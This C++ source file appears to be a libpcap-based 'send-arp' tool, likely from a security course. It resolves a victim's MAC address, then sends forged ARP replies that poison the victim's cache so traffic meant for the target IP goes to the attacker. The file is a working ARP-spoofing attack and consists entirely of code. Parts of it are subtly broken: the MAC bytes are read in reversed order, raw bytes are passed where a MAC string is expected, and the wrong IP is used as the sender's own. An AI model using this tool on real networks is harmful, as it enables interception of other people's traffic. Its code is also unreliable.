#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <unistd.h>
#include <array>
#include <string>
#include <fstream>
#include <regex>
#include <iostream>

using namespace std;

#define MAC_ADDR_LEN 6  // MAC 주소의 길이 정의

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool get_mac_address(const string& if_name, uint8_t* mac_addr_buf) {
    ifstream iface("/sys/class/net/" + if_name + "/address");
    string str((istreambuf_iterator<char>(iface)), istreambuf_iterator<char>());
    if (str.length() > 0) {
        string hex = regex_replace(str, regex(":"), "");
        uint64_t result = stoull(hex, 0, 16);
        for (int i = 0; i < MAC_ADDR_LEN; i++) {
            mac_addr_buf[i] = (uint8_t)((result & ((uint64_t)0xFF << (i * 8))) >> (i * 8));
        }
        return true;
    }
    return false;
}

string get_sender_mac(pcap_t* handle, const char* my_mac, const char* my_ip, const char* sender_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(my_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(my_mac);
    packet.arp_.sip_ = htonl(Ip(my_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* reply;
        int ret = pcap_next_ex(handle, &header, &reply);

        auto* eth_hdr = (EthHdr*)reply;
        if (ntohs(eth_hdr->type_) != EthHdr::Arp) continue;

        auto* arp_hdr = (ArpHdr*)(reply + sizeof(EthHdr));
        if (ntohs(arp_hdr->op_) != ArpHdr::Reply) continue;
        if (arp_hdr->sip_ != htonl(Ip(sender_ip))) continue;
        if (arp_hdr->tip_ != htonl(Ip(my_ip))) continue;

        return string(arp_hdr->smac_);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    string dev_str = string(dev);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    uint8_t my_mac[MAC_ADDR_LEN];

    if (!get_mac_address(dev_str, my_mac)) {
        cerr << "Failed to get MAC address for interface " << dev_str << endl;
        return -1;
    }

    int n = (argc - 2) / 2;

    for (int i = 1; i < n + 1; i++) {
        EthArpPacket packet;
        const char* sender_ip = argv[2 * i];
        const char* target_ip = argv[2 * i + 1];

        string sender_mac = get_sender_mac(handle, reinterpret_cast<const char*>(my_mac), argv[2], sender_ip);

        packet.eth_.dmac_ = Mac(sender_mac.c_str());
        packet.eth_.smac_ = Mac(my_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = Mac(my_mac);
        packet.arp_.sip_ = htonl(Ip(target_ip));
        packet.arp_.tmac_ = Mac(sender_mac.c_str());
        packet.arp_.tip_ = htonl(Ip(sender_ip));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    }

    pcap_close(handle);
    return 0;
}
